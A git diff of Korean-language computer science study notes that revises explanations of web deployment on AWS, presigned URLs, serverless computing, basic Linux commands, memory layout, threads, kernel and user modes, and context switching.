+    정적 웹사이트 호스팅에 최적화된 서비스로, 별도의 서버 구축 없이 빌드 결과물(HTML, CSS, JS 등)을 저장하고 배포한다. CloudFront CDN과 함께 사용해 빠르고 안정적인 콘텐츠 전달이 가능하다. SSR 지원은 별도 서버리스 함수나 백엔드가 필요하다.
 
   - AWS Amplify
 
-    AWS Amplify로 배포하게 되면 업로드 후, 빌드, 배포 과정을 거치기 때문에 SSR 적용이 가능하다.
+    S3와 CloudFront 기반 정적 웹사이트 및 SSR을 포함한 애플리케이션 배포를 자동화하는 서비스다. 빌드, 배포, 호스팅, 백엔드 서비스 통합 관리가 가능해 편리하다.
 
-  - 대표 프론트 배포 방법
+  - 정리
 
-    (1) Nginx : 정적 콘텐츠를 배포하게 해주는 웹 서버이다.
+    1. Nginx : 웹 서버로 정적 콘텐츠 및 리버스 프록시 역할
 
-    (2) AWS EC2 : 웹 서버와 WAS 서버 배포가 가능하다.
+    2. AWS EC2 : 서버 운영 및 SSR 가능
 
-    (3) AWS S3 + Cloudfront : 정적 콘텐츠(프론트 서버)를 배포하게 해준다.
+    3. AWS S3 + Cloudfront : 정적 콘텐츠 빠른 배포 및 캐싱
 
-    (4) AWS Amplify : 정적 콘텐츠(프론트 서버)를 배포하게 해줌. S3+ cloudfront 방법보다 간편하게 배포 가능하며 배포 자동화, 그리고 자동으로 S3와 Cloudfront가 구현된다.
+    4. AWS Amplify : S3 + CloudFront + CI/CD 자동화 + SSR 일부 지원
 
 <br>
 
@@ -10562,69 +10721,71 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # presigned URL
+### # Presigned URL
 
-- AWS의 presigned URL은 미리 서명된 URL을 통해 접근 권한이 없는 S3 버킷에 특정 유효기간동안 get, put이 가능하도록 하는 것이다. presigned URL을 생성하기 위한 createPresignedPost 메소드를 활용할 수 있다.
+- Presigned URL
+
+  Presigned URL은 AWS S3 객체에 대해 별도의 권한 없이도 특정 작업(GET, PUT 등)을 한정된 시간 동안 허용하는 미리 서명된 임시 URL입니다. Presigned URL을 생성하기 위한
+  createPresignedPost 메소드를 활용할 수 있다.
 
 - 동작 방식
 
-  1. 사용자가 이미지 업로드를 한다.
+  1. 사용자가 클라이언트에서 업로드할 파일 이름 등 메타데이터를 서버에 요청한다.
 
-  2. 클라이언트는 서버에 filename을 보내며 PresignedUrl 요청을 보낸다.
+  2. 서버는 AWS SDK를 통해 Presigned URL을 생성하여 클라이언트에 응답한다.
 
-  3. 서버는 응답값으로 PresignedUrl과 파일 이름뒤에 날짜가 추가된 filename을 보낸다.
+  3. 클라이언트는 이 Presigned URL을 이용해 직접 S3에 PUT 요청으로 파일을 업로드한다.
 
-  4. 클라이언트는 PresignedUrl에 Put 메소드로 file을 함께 넘겨주면 업로드가 완료된다.
-
-  5. 업로드 후 받은 이미지 경로를 String 형태로 서버에 전달한다.
+  4. 업로드가 완료되면, 클라이언트는 해당 파일의 S3 URL 또는 파일 경로를 서버에 전달하여 저장하거나 추후 사용한다.
 
 <br>
 
-### # **서버리스 아키텍처**
-
-<br>
+### # 서버리스 아키텍처
 
 - 서버리스 아키텍처란?
 
-  서버리스(Serverless)를 직역하면 `서버가 없다`라는 의미이다. 하지만 사실상 서버가 없다는 것이 아니다. 개발자가 서버를 직접 관리할 필요가 없는 아키텍처를 말한다.
+  서버리스는 ‘서버가 없다’는 뜻이 아니라, 개발자가 서버 인프라를 직접 관리하지 않아도 되는 아키텍처를 의미
 
-<br>
+- 기존 서비스 모델과 클라우드 서비스 모델 비교
 
-- 기존 서비스 모델
+  | 구분                               | 설명                                                                                                             | 예시                             |
+  | ---------------------------------- | ---------------------------------------------------------------------------------------------------------------- | -------------------------------- |
+  | 자체 시스템 관리 (온프레미스)      | 하드웨어부터 네트워크, OS, 서버, 애플리케이션까지 모두 직접 구축 및 운영                                         | 자체 데이터센터                  |
+  | IaaS (Infrastructure as a Service) | 가상 서버, 스토리지, 네트워크 등 인프라를 클라우드로 제공. 서버 OS 설치 및 애플리케이션 배포 등은 직접 관리 필요 | AWS EC2, Microsoft Azure VM      |
+  | PaaS (Platform as a Service)       | 인프라 + 런타임 환경 제공. 애플리케이션 개발과 배포에 집중할 수 있으며 자동 확장과 로드 밸런싱 기능 지원         | Heroku, AWS Elastic Beanstalk    |
+  | SaaS (Software as a Service)       | 완성된 소프트웨어를 인터넷으로 제공. 사용자는 설치 없이 웹에서 바로 사용 가능                                    | Gmail, Google Workspace, Dropbox |
 
-  - 자체적 시스템 설계 (PaaS, Packaged Software)
-
-    시스템에서 필요한 모든 인프라를 직접 관리하는 것을 의미한다. 공간, 하드웨어, 네트워크, 운영체제 등 모두 직접 관리하는 것이다. 단점은 시간과 비용 소모가 크다.
-
-  - 클라우드 서비스 모델
-
-    - 서비스형 인프라 (IaaS, Infrastructure as a Service)
-
-      서버, 스토리지, 네트워킹 및 가상화된 컴퓨팅 인프라를 제공한다. 해당 서비스 모델을 제공받는 클라이언트는 서버자원, 네트워크, 전력 등의 인프라를 직접 구축할 필요 없이 관리자 패널에서 인프라를 구성하고 사용하면 된다. 가상머신을 만들고, 네트워크를 설정하고, 하드웨어도 설정하고, 거기에 운영체제를 설치해서 애플리케이션을 구동 할 수 있고 사용량을 쉽게 모니터링 할 수 있다. 또한 트래픽이 증가하거나 감소함에 따라 유연한 방식으로 컴퓨팅 리소스를 운영할 수 있다. IaaS의 예시로는 AWS, Microsoft Azure 등이 있다.
-
-    - 플랫폼을 통한 서비스 (PaaS, Platform as a Service)
-
-      IaaS 에서 한번 더 추상화된 모델이라고 생각하면 된다. 네트워크, 그리고 런타임까지 제공된다. 해당 서비스 모델을 제공받는 클라이언트는 응용 프로그램을 구축하는 데에만 집중할 수 있고 애플리케이션만 배포하면 바로 구동시킬 수 있게 된다. PaaS의 예시로는 Hiroku, AWS Elastic Beanstalk, Azure App Services 등이 있다. 이를 사용하면 `Auto Scaling(요청 양에 따른 가상 서버 대수 증가)` 및 `Load Balancing(여러 가상 서버에 요청 분산)`도 손쉽게 적용 할 수 있다.
-
-    - 서비스형 소프트웨어 (SaaS, Software as a Service)
-
-      공급업체가 모든 물리적 및 가상 핵심 인프라, 미들웨어, 데이터베이스 관리 시스템, 개발 툴 등을 제공하고 호스팅한다. 여기에 추가로 `데이터`와 `응용 프로그램`이 포함된다. 즉, 특정 앱 또는 웹 포털을 통해 액세스하는 서비스로, 클라이언트 조직의 최종 사용자에게 제공되는 완전한 소프트웨어 솔루션을 말한다. 사용자는 별도의 설치없이 인터넷 연결만 가능하다면 해당 소프트웨어를 즉시 사용할 수 있다. SaaS의 예시로는 웹 메일, 구글 클라우드, 아이 클라우드, 드롭박스 등이 있다.
-
-<br>
-
-- 서버리스 컴퓨팅 서비스
+- 서버리스 컴퓨팅 서비스 종류
 
   - BaaS (Backend as a Service)
 
-    BaaS는 백엔드 관리자 영역을 모듈화하여 서비스로 제공한다는 개념인데 앱 개발에 있어서 필요한 기능들(데이터베이스, 소셜서비스 연동, 파일시스템 등)을 API로 제공해준다. 이 기능들을 제공해줌으로서 개발자들이 서버 개발을 하지 않고도 필요한 기능을 쉽고 빠르게 구현할 수 있고 사용한 만큼 비용을 지불한다. 대표적인 BaaS의 예시로는 Auth0, AWS Cognito, Firebase 등이 있다.
+    - 미리 구축된 백엔드 기능(API, 인증, 데이터베이스, 파일 저장 등)을 서비스 형태로 제공
+
+    - 개발자가 직접 서버 코드를 작성하지 않아도 기능을 쉽게 사용할 수 있음
+
+    - 사용량 기반 과금
+
+    - 예시: Firebase, AWS Cognito, Auth0
 
   - FaaS (Function as a Service)
 
-    코드, 즉 함수를 서비스로 제공한다. 애플리케이션 개발에서 서버를 프로비저닝하거나 관리하지 않고도 코드를 실행할 수 있도록 해주는 컴퓨팅 서비스이다. 함수를 실행하기 위해 서버를 올리고 런타임을 구성하고 코드를 배포해서 실행해야 하는 일련의 과정을 없애고, 원하는 로직을 함수로 등록해놓고 각 클라우드 서비스 제공사의 조건만 충족하면 특정 이벤트가 발생했을 때 함수가 호출된다. 함수가 호출되면 컨테이너나 가상머신(VM)이 실행되며 정의한 함수가 런타임 내에서 실행된 다음 작업을 마치면(혹은 최대 타임아웃 시간이 지나면) 종료된다. 그리고 이 함수들이 실행되는 횟수, 시간에 비례하여 비용을 지불하게 된다.
+    - 코드를 함수 단위로 작성해 클라우드에서 이벤트 기반으로 실행하는 컴퓨팅 서비스
 
-    FaaS는 백엔드 구현, 크롤링, 이미지 업로드 시 리사이징, AWS Cloudwatch 및 CloudTrail과의 연동을 통한 로그 분석 및 실시간 모니터링, 기타 자동화 작업 등 다양한 방식으로 활용이 가능하다. 넷플릭스의 경우 동영상 인코딩, 검증, 태깅, 공개, 백업 등의 작업들을 `AWS Lambda`를 통해 자동화 시켰다.
+    - 서버 프로비저닝, 관리 불필요
 
-    하지만 FaaS 사용 시 함수에서 사용 가능한 자원에 제한(AWS에서는 최대 1500MB 메모리 사용, 최대 300초의 처리 시간), 콜드 스타트(호출 시 함수가 구동되는데 시간이 걸림), 로컬 데이터 사용 불가능(함수들은 무상태적이므로 로컬 스토리지 사용 불가 및 변수와 데이터 공유 불가능)하다는 특징을 고려하며 사용해야한다.
+    - 함수가 호출되면 클라우드 환경에서 실행 후 종료, 사용한 만큼 비용 지불
+
+    - 특징:
+
+      - 무상태(stateless)로 설계해야 함 (함수 간 상태 공유 불가, 로컬 스토리지 등 로컬 데이터 사용 불가)
+
+      - 콜드 스타트 문제 존재 (처음 호출 시 실행 지연)
+
+      - 자원의 제한, 실행 시간 및 메모리 제한 존재 (예: AWS Lambda는 최대 15분, 메모리 최대 10GB 등)
+
+    - 용도 예시: API 백엔드, 이미지 리사이징, 데이터 처리, 자동화 작업 등
+
+    - 예시: AWS Lambda, Azure Functions, Google Cloud Functions
 
 <br><br><br>
 
@@ -10634,115 +10795,103 @@ function GenericReturnFunc<T>(arg: T): T {
 
 ### # 리눅스 쉘 명령어
 
-<br>
-
 - man : 다양한 리눅스 명령어의 사용법을 알 수 있다.
 
 - mkdir : 디렉토리 생성
 
-- ls : 현재 폴더의 폴더 및 파일 확인
+- ls : 현재 폴더 안에 있는 파일과 폴더 목록 출력
 
-- pwd : 현재 디렉토리 경로 출력
+- pwd : 현재 작업 중인 디렉토리의 절대 경로 출력
 
 - cd : 디렉토리 이동
 
-- echo : 텍스트 출력
+- echo : 텍스트나 변수 값을 출력
 
-- sudo : 다른 사용자의 권한을 얻음
+- sudo : 다른 사용자의 권한을 얻거나 관리자(root) 권한으로 명령 실행할 떄 사용
 
-- cp : 디렉토리 복사
+- cp : 디렉토리/파일 복사
 
-- mv : 디렉토리 경로 이동 및 이름 수정
+- mv : 디렉토리/파일 경로 이동 및 이름 수정
 
-- clear : 쉘 창에 있는 기록 지우기
+- clear : 터미널 깨끗하게 정리
 
 - cat : 텍스트 출력, 여러 파일을 붙혀서 실행 가능
 
-- history : 실행했던 명령어 리스트 출력
+- history : 쉘에서 실행한 명령어 이력
 
-- find : 파일 및 디렉토리 검색
+- find : 특정 조건에 맞는 파일/디렉토리 검색
 
-- ps : 프로세스 목록 및 상태 출력
+- ps : 현재 실행 중인 프로세스 목록 및 상태 출력
 
-- curl : Client URL, 웹서버에 요청을 보낼 수 있음
+- curl : 웹서버에 HTTP 요청을 보낼 수 있는 도구로, API 호출 등 다양하게 사용 (Client URL)
 
 - grep : 정규표현식 사용으로 파일 내에 특정 문자열 찾은 후 출력
 
-- chmod : 파일 권한 변경
+- chmod : 디렉토리/파일 권한 변경
 
 - nohup : 터미널 종료 후에도 계속 백그라운드에서 작업 유지
 
 <br>
 
-### # **비트, 바이트, 32비트 64비트 차이**
-
-<br>
+### # 비트, 바이트
 
 - 비트(bit)
 
-  컴퓨터의 처리 정보의 최소 단위이다. 비트는 바이너리 디짓의 약자로 바이너리는 2진수를 뜻하고 디짓은 자릿 수를 뜻한다. 0또는 1이 하나의 비트가 된다. 컴퓨터는 0 또는 1의 나열로 일을 처리하는데 결국 비트열(비트의 나열)로 모든 것을 표현하게 되는 것이다.
-
-<br>
+  정보의 최소 단위로, 0 아니면 1 중 하나의 값을 가지는 아주 작은 데이터 조각이다. 0또는 1이 하나의 비트가 된다. 컴퓨터는 0 또는 1의 나열로 일을 처리하는데 결국 비트열(비트의 나열)로 모든 것을 표현하게 되는 것이다. 비트가 바이너리 코드를 구성하는 조각임. (ex 1010이라는 4자리 이진수(바이너리 코드)는 4개의 비트로 구성된 것)
 
 - 바이트(byte)
 
-  컴퓨터는 일반적으로 8bit를 하나의 단위로 묶어 사용하는데 이것이 바이트이다.
-
-<br>
+  컴퓨터는 일반적으로 8bit를 하나의 단위로 묶어 사용하는데 이것이 바이트이다. 바이너리 코드의 작은 한 조각이다.
 
 - 32비트와 64비트 차이
 
-  CPU가 정보를 처리하는 최소단위를 레지스터라고 하며 레지스터는 CPU 내부의 메모리이다. 레지스터는 명령어 해석이나 연산시에 사용되는 데이터를 순간적으로 저장한다. 여기서 32비트와 64비트의 차이는 CPU가 한번에 처리하는 레지스터의 크기가 32비트 혹은 64비트냐에서 차이가 나는 것이다. 또한 처리량의 한계치가 단순히 두 배가 차이나는 것이 아닌 32비트는 2의 32제곱이고, 64는 2의 64제곱이므로 차이가 크다.
+  - CPU가 정보를 처리하는 최소 단위를 레지스터라고 하며 레지스터는 CPU 내부의 메모리이다. 레지스터는 명령어 해석이나 연산시에 사용되는 데이터를 순간적으로 저장한다.
+
+  - 32비트와 64비트는 CPU 내부 레지스터가 한 번에 처리할 수 있는 데이터 크기를 의미
+
+  - 처리량의 한계치가 단순히 두 배가 차이나는 것이 아닌 32비트는 2의 32제곱이고, 64는 2의 64제곱이므로 차이가 크다.
 
 <br>
 
-### # **Parsor에 대해 설명하시오**
-
-<br>
+### # Parsor
 
 - 파싱(Parsing)
 
-  구문 분석이라고도 하며 구문 분석의 통해 문서나 문장을 구성 성분으로 분해하고 위계 관계를 분석하여 문장의 구조를 결정하는 것을 말한다. 예를 들어 브라우저 렌더링 엔진에 HTML 파서가 HTML 문서를 파싱하여 DOM트리를 형성하는 것을 말한다.
+  - 구문 분석이라고도 하며 문서나 문장을 구성 요소로 분해하고 그 요소들 간의 위계 관계를 분석해 문장의 구조를 결정하는 과정
 
-<br>
+  - 브라우저 렌더링 엔진에서 HTML 파서가 HTML 문서를 파싱하여 DOM 트리를 형성하는 것이 대표적인 예시다.
 
 - 파서(Parser)
 
-  컴파일러의 일부로 parsing을 수행하는 프로그램
+  - 파싱 작업을 수행하는 프로그램 또는 컴파일러의 한 구성 요소
+
+  - 입력된 텍스트나 코드의 문법적 구조를 분석해 의미 있는 구조(예: 트리 형태)를 만들어 내는 역할을 한다.
 
 <br>
 
-### # **커넥션 풀(Connection Pool)**
-
-<br>
+### # 커넥션 풀(Connection Pool)
 
 - 커넥션 풀(Connection Pool)이란?
 
-  커넥션 풀이란 DB와 미리 커넥션(connection, 연결)을 해놓은 객체들을 풀(pool, 웅덩이)에 저장해두었다가, 클라이언트 요청이 오면 커넥션을 빌려주고, 처리가 끝나면 다시 커넥션을 반납받아 풀에 저장하는 방식을 말합니다.
+  데이터베이스와 미리 연결된 커넥션 객체들을 일정 개수만큼 만들어 풀(pool)에 저장해둔다. 클라이언트 요청 시 이 커넥션 객체를 빌려주고, 작업이 끝나면 다시 반납받아 재사용하는 방식이다.
+
+- 커넥션 풀을 사용하는 이유 및 장점
+
+  1. 빠른 접속 : 매번 새로 연결하는 오버헤드 없이 기존 커넥션을 재사용해 속도가 빠르다.
+
+  2. 서버 자원 관리 : 최대 연결 수를 제한해 DB 서버 과부하를 방지한다.
+
+  3. 유지 보수 편리 : DB 접속 관련 코드를 모듈화해 관리가 쉽고 DB 환경 변경 시 일괄 대응이 가능하다.
+
+  4. 비용 절감 : 새로운 연결 생성과 종료에 드는 비용과 시간을 절약한다.
 
 <br>
 
-- 커넥션 풀(Connection Pool)을 쓰는 이유와 단순히 커넥션을 새로 만드는 것의 차이
-
-  (1) 빠른 접속 : DB 접속 설정 객체를 미리 만들어 연결하여 메모리 상에 등록해 놓기 때문에 불필요한 작업(커넥션 생성, 삭제)이 사라지므로 클라이언트가 빠르게 DB에 접속이 가능하다.
-
-  (2) 서버 자원 고갈 방지 : DB Connection 수를 제한할 수 있어서 과도한 접속으로 인한 서버 자원 고갈 방지가 가능하다.
-
-  (3) 쉬운 유지 보수 : DB 접속 모듈을 공통화하여 DB 서버의 환경이 바뀔 경우에도 쉬운 유지 보수가 가능하다.
-
-  (4) 비용 절감 : 연결이 끝난 Connection을 재사용함으로써 새로 객체를 만드는 비용을 줄일 수 있다.
-
-<br>
-
-### # **프로세스와 스레드의 차이**
-
-<br>
+### # 프로세스, 스레드
 
 - 프로그램
 
   특정 작업을 실행하기 위한 규칙 또는 순서를 나타내는 명령어들의 모음이다. 아직 실행되지는 않았지만, 실행 가능한 상태의 정적인 존재이다. (ex chrome.exe, node, 카카오톡 설치 파일)
-
-<br>
 
 - 프로세스
 
@@ -10774,213 +10923,279 @@ function GenericReturnFunc<T>(arg: T): T {
 
 <br>
 
-### # **싱글스레드(Single Thread)언어와 멀티스레드(Multi Thread) 언어의 차이점은?**
-
-<br>
+### # 싱글스레드(Single Thread)언어, 멀티스레드(Multi Thread) 언어 차이
 
 - 싱글 스레드
 
-  프로세스가 단일 스레드로 동작하는 방식이다. 하나의 레지스터, 스택으로 표현한다. 가장 대표적으론 자바스크립트가 싱글 스레드 언어이다.
+  - 개념
 
-<br>
+    - 하나의 프로세스가 하나의 스레드만을 사용해 작업을 처리하는 방식이다.
 
-- 싱글 스레드 장점
+    - 스레드 하나가 순차적으로 명령을 실행하며, 자원 동기화가 필요 없다.
 
-  (1) 동기화 X : 멀티 스레드와 같이 자원의 동기화를 신경 쓸 필요가 없다.
+    - 대표적인 싱글 스레드 언어는 자바스크립트이다.
 
-  (2) 문맥 전환 X : 단일 스레드로 동작하기 때문에 문맥을 교환할 필요가 없다.
+  - 장점
 
-  (3) 낮은 난이도 : 프로그래밍이 쉽다.
+    1. 동기화 문제 없음: 여러 스레드 간 자원 공유가 없어 동기화 이슈가 없다.
 
-<br>
+    2. 문맥 전환 없음: 스레드 전환이 없으므로 문맥 교환 비용이 없다.
 
-- 싱글 스레드 단점
+    3. 프로그래밍 난이도 낮음: 구조가 단순해 코딩과 디버깅이 쉽습니다.
 
-  (1) CPU 활용 : 싱글 스레드는 하나의 물리적 코어밖에 사용하지 못해 멀티 코어 머신에서 CPU 사용을 최적화할 수 없다. 최적화를 위해선 Cluster 모듈을 이용하여 여러 프로세스를 사용할 수 있다. 하지만 프로세스끼리의 자원 공유는 어렵기 때문에 Redis와 같은 부가 인프라가 필요하다.
+  - 단점
 
-  (2) 동기적 실행 : 이전 작업이 수행되어야 다음 작업을 할 수 있다.
+    1. CPU 활용 제한: 한 코어만 사용하므로 멀티코어 CPU를 제대로 활용하지 못한다.
 
-  (3) 에러 시 멈춤 : 싱글 스레드는 에러 처리를 못하는 경우 실행이 멈춘다.
+    2. 동기적 실행: 작업이 순차적으로 처리되어 느릴 수 있다.
 
-<br>
+    3. 에러에 취약: 스레드 하나에 에러가 발생하면 전체 프로세스가 멈출 위험이 있다.
 
 - 멀티 스레드
 
-  프로세스의 두 개 이상의 스레드가 프로세스 내부에서 자원을 공유하여 작업을 수행한다. 각각의 스레드가 고유 레지스터와 스택으로 표현된다. 이러한 작업은 문맥 전환(컨텍스트 스위칭)을 통해 이루어지며 매우 빠르기 때문에 유저는 동시에 수행되는 것처럼 보이는 것이다.
+  - 개념
+
+    - 하나의 프로세스 내에서 여러 스레드가 병렬 또는 동시 작업을 수행하는 방식이다.
+
+    - 각 스레드는 독립된 레지스터와 스택을 가지며, 힙 메모리는 공유한다.
+
+    - 스레드 간 전환(문맥 전환)은 빠르지만 비용이 발생한다.
+
+  - 장점
+
+    - 높은 응답성: 한 스레드가 지연되거나 중단되어도 다른 스레드가 작업을 이어간다.
+
+    - 효율적인 자원 사용: 메모리와 자원을 공유해 효율적이다.
+
+    - 병렬/비동기 처리 가능: 작업을 동시에 수행할 수 있어 처리 속도가 향상된다.
+
+  - 단점
+
+    - 문맥 전환 비용: 스레드 전환에 따른 오버헤드가 발생할 수 있다.
+
+    - 동기화 문제: 공유 자원에 대한 동기화 필요성 때문에 개발 난이도가 높고 버그 위험이 있다. 공유하는 변수나 자료구조에 여러 스레드가 동시 접근 시 예상치 못한 값을 수정하거나 가져올 수 있기 때문에 동기화가 필요하다. 즉, 스레드 스케쥴링을 신경써야 함
+
+    - 프로그래밍 난이도 상승: 동시성 문제를 관리해야 하므로 복잡하다.
+
+- 싱글 스레드 Vs 멀티 스레드 차이
+
+  | 항목                       | 싱글 스레드                          | 멀티 스레드                          |
+  | -------------------------- | ------------------------------------ | ------------------------------------ |
+  | 스레드 수                  | 1                                    | 2개 이상                             |
+  | 에러 시 프로세스 중단 여부 | 에러 발생 시 전체 프로세스 중단 가능 | 한 스레드 에러 시 다른 스레드로 극복 |
+  | 문맥 전환 여부             | 없음                                 | 있음                                 |
+  | 작업 실행 방식             | 동기적                               | 병렬/비동기적                        |
+  | 프로그래밍 난이도          | 쉬움                                 | 어려움                               |
+  | CPU 자원 활용              | 한 코어만 사용                       | 멀티 코어 활용 가능                  |
+  | 자원 소모                  | 상대적으로 적음                      | 상대적으로 많음                      |
+  | 동기화 처리 필요성         | 없음                                 | 있음                                 |
+  | 스레드 스케줄링 신경쓰기   | 필요 없음                            | 필요                                 |
 
 <br>
 
-- 멀티 스레드 장점
+### # 메모리 구조
 
-  (1) 응답성 : 스레드 중 하나가 지연되거나 중단되어도 다른 스레드로 극복
+- 메모리 구조
 
-  (2) 경제성 : 프로세스 내 자원 공유로 메모리 공간과 시스템 자원 소모가 줄어든다.
+  - 프로그램이 실행되면 운영체제는 해당 프로세스를 위해 메모리를 아래와 같이 구분하여 할당.
 
-  (3) 비동기적 실행 : 작업이 병렬적으로 처리될 수 있다.
+  - 대부분의 시스템 언어나 네이티브 언어에서 공통적으로 적용되는 개념이지만 사용되는 언어의 추상화에 따라 동일하게 1:1로 적용되지는 않는다.
 
-<br>
+- 구분
 
-- 멀티 스레드 단점
+  1. 코드 영역
 
-  (1) 느림 : 스레드 간의 문맥 전환, 동기화 등의 이유로 싱글 스레드보다 느릴 수 있다.
+  - 실행할 프로그램의 기계어 코드(Instructions)가 저장
 
-  (2) 동기화 O : 스레드는 데이터와 힙 영역을 공유하므로 공유하는 변수나 자료구조에 여러 스레드가 동시 접근 시 예상치 못한 값을 수정하거나 가져올 수 있기 때문에 동기화가 필요하다. (스레드 스케쥴링을 신경써야 함)
+  - 일반적으로 읽기 전용(Read-only)이며, 실행만 가능하고 수정은 불가능
 
-  (3) 높은 난이도 : 프로그래밍이 어렵다.
+  2. 데이터 영역
 
-<br>
+  - 초기화된 전역 변수와 정적(static) 변수가 저장
 
-- 싱글 스레드, 멀티 스레드 차이
+  - 프로그램 실행 전 컴파일 타임에 메모리 크기가 결정
 
-  (1) 스레드 수 : 싱글 하나 / 멀티 하나 이상
+  3. BSS 영역
 
-  (2) 에러 시 멈춤 : 싱글 O / 멀티 X
+  - 초기화되지 않은 전역 변수와 정적 변수가 저장됩니다.
 
-  (3) 문맥 전환 : 싱글 X / 멀티 O
+  - 데이터 영역과 유사하지만 구분해서 관리된다.
 
-  (4) 동기 비동기 : 싱글 동기 / 멀티 비동기
+  - 보통 데이터 영역과 함께 묶어서 "데이터 영역"이라 표현하기도 한다.
 
-  (5) 프로래밍 난이도 : 낮음 / 멀티 어려움
+  4. 스택 영역
 
-  (6) 자원 소모 : 싱글 싱글 스레드 덜 사용 하므로 상대적으로 낮음 / 멀티 상대적으로 높음
+  - 지역 변수와 함수 매개변수가 저장된다.
 
-  (7) 스레드 스케쥴링 : 싱글 신경안씀 / 멀티 신경써야함
+  - 함수 호출 시 스택 프레임이 쌓이고, 함수 종료 시 자동으로 해제된다.
 
-<br>
+  - 컴파일 타임에 최대 크기가 정해지고, LIFO(후입선출) 방식으로 메모리를 관리한다.
 
-### # **메모리가 어떻게 구성되어 있는지 설명해 주세요.**
+  - 빠르고 자동으로 메모리를 관리하지만, 크기가 제한적이다.
 
-<br>
+  4. 힙 영역
 
-(1) 코드 영역 : 실행될 프로그램의 코드가 저장되어 있는 영역
+  - 개발자가 명시적으로 동적 할당하는 메모리 공간입니다. (malloc, new 등)
 
-(2) 데이터 영역 : 전역 변수와 정적 변수가 저장되어 있는 영역
+  - 런타임에 크기가 결정되며, 명시적으로 해제하지 않으면 메모리 누수 발생 가능성이 있다.
 
-(3) 스택 영역 : 지역 변수와 매개 변수가 저장되어 있으며, 함수의 호출과 함께 할당되는 영역
-
-(4) 힙 영역 : 사용자에 의해 동적으로 할당되고 해제될 수 있는 메모리 영역으로 스택 영역은 컴파일 타임(코드가 컴파일 되는 과정, 신택스 오류나 타입체크 오류같은 컴파일링을 방해하는 에러가 컴파일 에러)에 크기가 결정되고, 힙 영역은 런타임(프로그램이 실제 실행되는 과정, 0나누기 오류나 Null참조 오류 등 런타임을 방해하는 에러가 런타임 에러)에 크기가 결정
+  - 상대적으로 느리지만 유연하게 메모리를 사용할 수 있다.
 
 <br>
 
-### # **사용자 수준 스레드, 커널 수준 스레드, 혼합 스레드**
-
-<br>
+### # 사용자 수준 스레드, 커널 수준 스레드, 혼합 스레드
 
 - 스레드(Thread)
 
-  프로세스는 커널 위에서 실행되고 있는 작업인데 이 프로세스 내에서 실행되는 흐름의 단위가 스레드이다. 프로세스는 이러한 스레드를 한 개 이상으로 나눌 수 있다. 스레드는 프로그램 카운터와 스택 포인터 등을 비롯한 스레드 실행 환경 정보, 지역 데이터, 스택을 독립적으로 가지면서 코드, 전역 데이터, 힙을 다른 스레드와 공유한다. 스레드는 크게 커널 영역과 사용자 영역으로 구분된다.
-
-<br>
+  스레드는 프로세스 내에서 실행 흐름의 최소 단위이다. 하나의 프로세스는 하나 이상의 스레드를 가질 수 있으며, 스레드끼리는 코드, 전역 변수, 힙 영역은 공유하고, 스택, 레지스터, 프로그램 카운터(PC) 등은 독립적으로 유지한다.
 
 - 사용자 수준 스레드
 
-  스레드 라이브러리를 이용하여 작동하고, 사용자 영역에 있는 스레드 여러 개가 커널 영역의 스레드 한 개에 다대일로 매핑된다.
-
-<br>
+  스레드가 사용자 영역에서 관리된다. 스레드 생성, 제거, 전환 등의 작업이 커널에 개입 없이 사용자 영역에서 수행된다. 일반적으로 스레드 라이브러리를 이용하여 구현되고 사용자 스레드 여러 개가 커널 스레드 하나에 매핑되므로 N:1 구조이다.
 
 - 커널 수준 스레드
 
-  커널에서 지원하고 사용자 영역 스레드별로 커널 영역 스레드가 일대일로 매핑된다.
-
-<br>
+  스레드가 커널에서 직접 관리된다. 각 스레드는 커널 영역에 대응되는 커널 스레드와 1:1로 매핑된다.
 
 - 혼합형 스레드
 
-  사용자 수준 스레드와 커널 수준 스레드를 혼합한 형태로 사용자 영역에서 스레드를 생성하고 다수의 사용자 수준 스레드에 다수의 커널 스레드가 다대다로 매핑된다.
+  사용자 수준 스레드와 커널 수준 스레드를 다대다(N:M)로 매핑하는 구조이다. 사용자 스레드는 커널 스레드 중 가용한 스레드에 매핑되어 실행된다.
 
 <br>
 
-### # CPU 권한 모드 중 커널모드와 유저모드의 차이는?
-
-<br>
+### # CPU 권한 모드 중 커널모드, 유저모드의 차이
 
 - 커널모드
 
-  모든 자원(드라이버, 메모리, CPU 등)에 접근 및 명령할 수 있는 모드, OS가 CPU를 쓸 때 사용하는 모드
+  - 운영체제(OS)가 실행되는 모드로, CPU가 전체 시스템 자원에 대한 접근 권한을 가진다.
 
-<br>
+  - 메모리, 하드웨어, I/O 장치, CPU 제어 등 모든 명령을 실행 가능
+
+  - 시스템 콜, 인터럽트 처리, 디바이스 드라이버 실행 등이 이 모드에서 수행
+
+  - 보안 위험도는 크지만, 성능과 제어 측면에서 필수적인 영역
+
+  - 예시 : OS 커널, 디바이스 드라이버, 파일 시스템, 네트워크 스택 등
 
 - 유저모드
 
-  사용자가 접근할 수 있는 영역을 제한적으로 두고 프로그램의 자원에 함부로 접근하지 못하도록 제어하는 모드, 응용 프로그램이 실행되는 모드로 보통 애플리케이션 코드는 유저모드에서 실행
+  - 일반적인 애플리케이션이 실행되는 모드
+
+  - 직접적인 하드웨어나 시스템 자원 접근은 불가능하며, 제한된 권한만 가진다.
+
+  - 시스템 자원이 필요한 경우, 시스템 콜을 통해 커널에게 요청하여 작업을 수행
+
+  - 이렇게 제한함으로써 시스템 안정성과 보안이 확보
+
+  - 예시 : 웹 브라우저, 게임, 텍스트 에디터, 사용자 애플리케이션 등
 
 <br>
 
-### # **스레드 세이프가 뭔지 아는지?**
+### # 스레드 세이프
+
+멀티 스레드 환경에서 하나의 함수나 객체가 여러 스레드로부터 동시에 호출되더라도, 결과가 올바르게 동작하는 성질을 의미한다. 즉, 공유 자원에 대한 접근 시 동기화가 잘 되어 있어, 데이터 오염(race condition)이 발생하지 않고 예상한 대로 동작하는 것을 말한다.
 
 <br>
 
-- 멀티 스레드 프로그래밍에서 하나의 함수가 한 스레드로부터 호출되어 실행 중일 때, 다른 스레드가 그 함수를 호출하여 동시에 함께 실행되더라도 각 스레드에서의 함수의 수행 결과가 올바르게 나오는 것을 말한다.
+### # 문맥 전환(Context Switching)
+
+- 문맥 전환(Context Switching)
+
+  문맥 전환이란, CPU가 하나의 Task(프로세스 또는 스레드)를 실행하다가 다른 Task로 전환할 때, 현재 실행 중인 Task의 상태(문맥, Context)를 저장하고, 전환 대상 Task의 상태를 복원하는 작업을 말한다.
